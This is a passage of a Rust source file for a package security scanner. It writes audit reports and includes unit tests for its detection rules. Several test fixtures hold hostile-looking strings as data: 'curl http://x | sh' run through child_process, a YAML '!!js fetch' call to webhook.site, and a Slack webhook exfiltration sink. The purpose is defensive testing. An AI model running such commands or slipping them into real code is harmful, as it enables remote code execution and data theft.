        s.push_str("（无）\n\n");
    } else {
        for f in &report.findings {
            s.push_str(&format!(
                "- [{}] {} ({}/{}) {}\n",
                f.rule, f.message, f.severity.as_str(), f.confidence.as_str(),
                f.file.clone().unwrap_or_default()
            ));
        }
        s.push('\n');
    }
    s.push_str("## Agent investigation\n\n");
    s.push_str(&format!("Risk: {}\n", risk));
    s.push_str(&format!("Recommendation: {}\n", recommendation));
    s.push_str(&format!("\n{}\n", notes));
    std::fs::write(&file, s).map_err(|e| format!("写健康档案失败: {}", e))?;
    Ok(file.to_string_lossy().to_string())
}

/// 列出已有健康档案
pub fn list_health_records() -> Vec<String> {
    let dir = audit_dir();
    let Ok(entries) = std::fs::read_dir(&dir) else { return vec![] };
    let mut out: Vec<String> = entries
        .flatten()
        .filter(|e| e.path().extension().map(|x| x == "md").unwrap_or(false))
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    out.sort();
    out.reverse();
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn f(rule: &str, s: Severity, c: Confidence) -> Finding {
        Finding {
            rule: rule.into(), severity: s, confidence: c,
            message: "m".into(), evidence: "e".into(), file: None, line: None,
        }
    }

    #[test]
    fn scoring_uses_weights_and_confidence_coefficients() {
        // critical + certain = 45 → 55 分
        let (score, v) = score_findings(&[f("R1", Severity::Critical, Confidence::Certain)]);
        assert_eq!(score, 55);
        assert_eq!(v, Verdict::Critical);
        // high + likely = 16 → 84
        let (score, v) = score_findings(&[f("R2", Severity::High, Confidence::Likely)]);
        assert_eq!(score, 84);
        assert_eq!(v, Verdict::Suspicious);
        // info 不计分也不影响判决
        let (score, v) = score_findings(&[f("R6", Severity::Info, Confidence::Heuristic)]);
        assert_eq!(score, 100);
        assert_eq!(v, Verdict::Clean);
    }

    #[test]
    fn heuristic_findings_never_move_the_verdict() {
        // R1 是 heuristic → 即使 severity=critical 也不能把判决推到 critical
        let (_, v) = score_findings(&[f("R1", Severity::Critical, Confidence::Heuristic)]);
        assert_eq!(v, Verdict::Clean, "heuristic 发现不得改变判决");
        // 分数仍然被扣（0.5 系数）
        let (score, _) = score_findings(&[f("R1", Severity::Critical, Confidence::Heuristic)]);
        assert_eq!(score, 78); // 100 - 45*0.5 = 77.5 → round = 78
    }

    #[test]
    fn detects_secrets_and_ignores_placeholders() {
        let hits = scan_text("a.js", "const k = \"sk-abcdefghijklmnopqrstuvwxyz\";");
        assert!(hits.iter().any(|h| h.rule == "R7"));
        // 占位符应被排除
        let hits = scan_text("a.js", "const k = \"sk-xxxxxxxxxxxxxxxxxxxx\";");
        assert!(!hits.iter().any(|h| h.rule == "R7"));
    }

    #[test]
    fn detects_dynamic_exec_and_process_escape() {
        let hits = scan_text("a.js", "eval(\"1\");\nconst p = process.getBuiltinModule;");
        assert!(hits.iter().any(|h| h.rule == "R2"));
        assert!(hits.iter().any(|h| h.rule == "R3"));
    }

    #[test]
    fn detects_dead_loop_as_high_without_exit() {
        let hits = scan_text("a.js", "while (true) { doWork(); }");
        let r9: Vec<&Finding> = hits.iter().filter(|h| h.rule == "R9").collect();
        assert_eq!(r9.len(), 1);
        assert_eq!(r9[0].severity, Severity::High);

        // 有 break → 降为 info
        let hits = scan_text("a.js", "while (true) { if (x) break; }");
        let r9: Vec<&Finding> = hits.iter().filter(|h| h.rule == "R9").collect();
        assert_eq!(r9[0].severity, Severity::Info);
    }

    #[test]
    fn exfil_sink_denoise_on_guard_context() {
        let hits = scan_text("a.js", "const url = \"https://hooks.slack.com/x\";");
        assert_eq!(hits.iter().find(|h| h.rule == "R13").unwrap().severity, Severity::High);
        let hits = scan_text("a.js", "// DENY list\nconst url = \"https://hooks.slack.com/x\";");
        assert_eq!(hits.iter().find(|h| h.rule == "R13").unwrap().severity, Severity::Info);
    }

    #[test]
    fn r20_requires_child_process_binding() {
        // 无 child_process 绑定 → 不报 R20
        let hits = scan_text("a.js", "const s = \"curl http://x | sh\";");
        assert!(!hits.iter().any(|h| h.rule == "R20"));
        // 有绑定 → 报
        let hits = scan_text("a.js", "const cp = require('child_process'); cp.execSync(\"curl http://x | sh\");");
        assert!(hits.iter().any(|h| h.rule == "R20"));
    }

    #[test]
    fn config_injection_combo_escalates() {
        let txt = "x: !!js fetch('https://webhook.site/abc')";
        let hits = check_config_injection("cordis.yml", txt);
        assert_eq!(hits[0].severity, Severity::High);
        // 仅危险动词 → info
        let hits = check_config_injection("cordis.yml", "x: !!js child_process.exec('ls')");
        assert_eq!(hits[0].severity, Severity::Info);
    }

    #[test]
    fn capabilities_are_extracted() {
        let mut m = CapabilityManifest::default();
        extract_capabilities(
            "const u='https://api.example.com/v1'; spawn('curl'); require('lodash');",
            &mut m,
        );
        assert!(m.hosts.contains(&"api.example.com".to_string()));
        assert!(m.has_network);
        assert!(m.has_exec);
        assert!(m.imports.contains(&"lodash".to_string()));
    }

    #[test]
    fn scorecard_renders_both_sections() {
        let (score, verdict) = score_findings(&[f("R2", Severity::High, Confidence::Likely)]);
        let r = ScanReport {
            engine: "t".into(), target: "t".into(), source_count: 1,
            findings: vec![f("R2", Severity::High, Confidence::Likely)],
            static_score: score, verdict,
            capabilities: CapabilityManifest::default(),
            scanned_at: "now".into(),
        };
        let s = render_scorecard(&r, "demo@1.0.0");
        assert!(s.contains("VET 评分卡"));
        assert!(s.contains("staticScore"));
        assert!(s.contains("能力清单"));
        assert!(s.contains("不构成安全结论"));
    }
}
